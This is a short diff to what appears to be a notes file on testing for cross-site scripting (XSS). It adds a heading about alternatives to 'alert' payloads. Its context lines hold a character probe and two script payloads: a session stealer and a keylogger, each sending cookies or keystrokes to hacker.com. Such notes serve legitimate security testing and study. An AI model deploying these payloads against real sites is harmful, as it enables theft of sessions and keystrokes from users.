@@ -10,6 +10,8 @@
 
 ### Example: <>/\script'"=
 
+### 3) Use alternative to "alert" payload to test for XSS
+
 ### Session stealing: <script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>
 
 ### Keylogger: <script>document.onkeypress = function(p){ fetch ('https://hacker.com/log?key=' + btoa(p.key) );}</script>
